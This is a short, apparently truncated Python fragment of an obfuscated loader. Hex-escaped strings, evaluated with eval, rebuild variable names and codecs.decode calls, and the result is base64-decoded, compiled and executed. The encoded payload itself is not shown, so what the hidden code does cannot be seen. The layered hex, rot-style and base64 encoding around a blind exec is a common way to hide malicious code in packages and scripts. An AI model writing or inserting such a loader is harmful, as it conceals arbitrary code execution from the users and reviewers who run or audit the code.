trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
